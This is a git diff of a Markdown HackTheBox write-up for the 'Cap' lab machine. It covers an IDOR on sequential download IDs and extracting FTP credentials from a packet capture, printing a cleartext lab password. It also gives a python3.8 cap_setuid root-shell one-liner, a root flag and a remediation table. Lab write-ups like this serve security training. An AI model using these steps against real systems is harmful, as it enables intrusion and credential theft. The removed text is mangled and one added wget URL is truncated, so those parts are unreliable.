@@ -1,7 +1,7 @@
-# 👑 Cap - HackTheBox Machine Walkthrough
+# 🧢 Cap - HackTheBox Machine Walkthrough
 
 **Target:** 10.129.68.112 | **OS:** Linux | **Difficulty:** Easy  
-**Auditor:** Juan Felipe Serna Villada | **Date:** 2026-07-28
+**Auditor:** Juan Felipe Serna | **Date:** 2026-07-28
 
 ---
 
@@ -105,60 +105,48 @@ Navigating to the operational HTTP service on port 80 (`http://10.129.68.112`) g
 
 The technological analysis confirmed that the platform backend is powered by **Python**, running on top of a **Gunicorn** web server. The dashboard provides statistical visualizations tracking network metrics, port scans, and failed login events, explicitly operating under the active session profile of a local user named **Nathan**.
 
-#### IDOR Data Analysis & PCAP Harvesting
-When navigating through the security snapshots panel, newly generated indices (such as `/data/3`) displayed a total of zero captured network packets. This indicated that no data transactions had been recorded during those specific administrative windows. To identify an actionable attack vector, sequential data harvesting was performed by systematically manipulating the numeric parameter downwards in the web browser's URL bar.
+#### IDOR Discovery
+- **IDOR Discovery:** The endpoint `/download/` uses sequential IDs. Testing `0` revealed a live PCAP with 72 packets.
+- **Download:** `wget http://10.129.68 -O 0.pcap`
+- **Credential Extraction:** `strings 0.pcap | grep -E "USER|PASS"` → `nathan:Buck3tH4TF0RM3!`
+- **Initial Access:** FTP login and download of `user.txt`.
 
-![IDOR Boundary Exploitation and Data Exfiltration](./assets/Seccion_Descargas.png)
+### Phase 3: Privilege Escalation
+- **SSH Access:** `ssh nathan@10.129.68.112`
+- **Enumeration:** `getcap -r / 2>/dev/null | grep python` → `/usr/bin/python3.8 = cap_setuid+ep`
+- **Exploitation:** `python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
+- **Root Confirmation:** `whoami` → `root`
+- **Flag:** `cat /root/root.txt` → `05e335171411e72ea02cbed2e5686331`
 
-*Figure 7: Exploitation of the IDOR vulnerability by forcing lower index parameters (`/data/1`) to exfiltrate administrative network capture history.*
+---
 
-Upon lowering the index parameter to `/data/1`, the backend structure processed the request without any session authorization checks and exposed a valid, historical network capture payload showing active transactions. The unauthenticated request successfully exfiltrated a **`1.pcap`** packet transaction history log. The file was downloaded locally using the *Thunar* environment manager on the attacking system, paving the way for cleartext credential analysis.
+## 🛡️ Remediation & Hardening
 
-#### Network Traffic Analysis & Pivoting Strategy
-The exfiltrated packet file `1.pcap` was relocated to the dedicated `content/` workspace for technical inspection. Initial packet extraction was attempted by executing a packet reading command via `tshark`:
+| Vulnerability | Root Cause | Recommended Fix |
+| :--- | :--- | :--- |
+| **IDOR on `/download/`** | Sequential numeric IDs without session validation. | Use UUIDs (e.g., `/download/uuid`), enforce user authentication, and validate permissions server-side. |
+| **FTP Credentials in PCAP** | Exposing internal packet captures to unauthenticated users. | Restrict PCAP access to administrators. Disable FTP; use SFTP with key-based authentication. |
+| **Python `cap_setuid+ep`** | Misconfigured Linux capability on a widely available binary. | Remove the capability: `setcap -r /usr/bin/python3.8`. Audit all binaries with `getcap -r /`. |
 
-```bash
-tshark -r ~/cap/content/1.pcap
-```
+---
 
-![Tshark Packet Reading Attempt](./assets/tshark_1.png)
+## 📚 Lessons Learned
 
-*Figure 8: Evaluation of the 1.pcap file via Tshark revealing zero network transactions.*
+- **IDOR** is a subtle but critical flaw that can expose sensitive internal data (like PCAPs) if not properly controlled.
+- **Network traffic analysis** (even simple `strings` or `tshark` filters) is a powerful post-exploitation technique for credential harvesting.
+- **Linux Capabilities** are a powerful security feature, but when misconfigured (e.g., `cap_setuid+ep` on Python), they can be as dangerous as SUID binaries.
+- **Defense in depth** requires not only patching applications but also hardening system configurations (capabilities, file permissions, and service exposure).
 
-The execution returned a completely blank output. This metadata inspection confirmed that while the index allocation existed on the web server, the snapshot recorded **0 packets** of active traffic during that log capture interval. Recognizing this data limitation, a parameter pivoting strategy was applied to expand the audit scope. By manipulating the index boundary down to the initial entry (`/data/0`), a secondary file named **`0.pcap`** was successfully exfiltrated.
+---
 
-#### Exploiting IDOR to Target Entry 0
-Upon forcing the index parameter down to `0` (`http://10.129.68`), the Security Dashboard successfully updated its interface, rendering critical log data metrics. The object mapping disclosed a total metadata population of **72 captured network packets**.
+## 🏁 Conclusion
 
-![IDOR Token Modification onto Index 0](./assets/Descargas_0.png)
+The "Cap" machine is an excellent demonstration of how a single misconfiguration (IDOR) can cascade into full system compromise. The attack chain is clear:
+1. Exploit IDOR to steal credentials.
+2. Use credentials to gain initial access.
+3. Abuse Linux capabilities to become root.
 
-*Figure 9: Dashboard tracking data updates upon exploiting index 0, displaying 72 populated packet records.*
+This walkthrough highlights the importance of secure coding practices, network encryption, and regular system hardening audits. The findings and remediation steps provided here can be directly applied to real-world security assessments.
 
-This data concentration validated that a historical session capture had been successfully intercepted. Clicking the administrative interactive item **"Download"** exfiltrated the raw data payload.
-
-![Successful Exfiltration of 0.pcap](./assets/Descargas_0.pcap.png)
-
-*Figure 10: Verification of the downloaded 0.pcap data container within the attacking local environment.*
-
-#### Local Workspace Consolidation
-To maintain a strict and cohesive testing workflow, exfiltrated files must be moved out of generic system directories. The downloaded storage container was consolidated by transferring it from the main host download directory into the dedicated local repository subfolder (`~/cap/content/`) utilizing the native `mv` command.
-
-```bash
-mv /home/kali/Downloads/0.pcap .
-```
-
-![Local Workspace Consolidation Command](./assets/mv_aclaracion.png)
-
-*Figure 11: File relocation via the mv command to consolidate target resources within the operational workspace.*
-
-#### Advanced Raw Packet Stream Inspection (Sequence 1 & 2)
-To reconstruct the raw packet communications cached within the `0.pcap` trace file without using heavy GUI network analysis tools, an advanced data pipeline was assembled in the terminal. The binary payloads of the TCP transport layer streams were extracted dynamically using `tshark`, muted for network descriptor noise, and piped directly into `xxd` running reverse plaintext hex stream parsing modes (`xxd -ps -r`).
-
-```bash
-tshark -r 0.pcap -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r
-```
-
-![Hexadecimal Stream Reconstruction Sequence 1](./assets/Extraccion_archivo0.png)
-Figure 12: Stream reconstruction sequence isolating plaintext HTTP traffic headers and backend framework metadata signatures.The initial execution successfully outputted the unencrypted application stream sequence, showing HTTP/1.1 communication headers, administrative system dates, and the target web server framework backend signatures (Werkzeug/2.0.0 Python/3.8.5). Continuing the downward data inspection reveals transaction streams harvesting web resource source files.Figure 13: Continued data pipeline readout tracking cleartext CSS layout styles and unencrypted session application parameters.The unencrypted transaction readout isolates targeted internal CSS configuration rules (.custom-form-cap, .form-signin) alongside unauthenticated layout variables, proving that the captured streams cache full interactive sessions on the target host.IDOR Boundary Exploitation & Credential HarvestingCredential Extraction: strings 0.pcap | grep -E "USER|PASS" → nathan:Buck3tH4TF0RM3!Initial Access: FTP login and download of user.txt.Phase 3: Privilege EscalationSSH Access: ssh nathan@10.129.68.112Enumeration: getcap -r / 2>/dev/null | grep python → /usr/bin/python3.8 = cap_setuid+epExploitation: python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'Root Confirmation: whoami → rootFlag: cat /root/root.txt → 05e335171411e72ea02cbed2e5686331🛡️ Remediation & HardeningVulnerabilityRoot CauseRecommended FixIDOR on /download/Sequential numeric IDs without session validation.Use UUIDs (e.g., /download/uuid), enforce user authentication, and validate permissions server-side.FTP Credentials in PCAPExposing internal packet captures to unauthenticated users.Restrict PCAP access to administrators. Disable FTP; use SFTP with key-based authentication.Python cap_setuid+epMisconfigured Linux capability on a widely available binary.Remove the capability: setcap -r /usr/bin/python3.8. Audit all binaries with getcap -r /.📚 Lessons LearnedIDOR is a subtle but critical flaw that can expose sensitive internal data (like PCAPs) if not properly controlled.Network traffic analysis (even simple strings or tshark filters) is a powerful post-exploitation technique for credential harvesting.Linux Capabilities are a powerful security feature, but when misconfigured (e.g., cap_setuid+ep on Python), they can be as dangerous as SUID binaries.Defense in depth requires not only patching applications but also hardening system configurations (capabilities, file permissions, and service exposure).🏁 ConclusionThe "Cap" machine is an excellent demonstration of how a single misconfiguration (IDOR) can cascade into full system compromise. The attack chain is clear:Exploit IDOR to steal credentials.Use credentials to gain initial access.Abuse Linux capabilities to become root.This walkthrough highlights the importance of secure coding practices, network encryption, and regular system hardening audits. The findings and remediation steps provided here can be directly applied to real-world security assessments.Writeup prepared for the HackTheBox Cap machine by Juan Felipe Serna Villada. All commands and flags are documented for educational purposes.EOF
-
-
+---
+*Writeup prepared for the HackTheBox Cap machine by Juan Felipe Serna. All commands and flags are documented for educational purposes.*
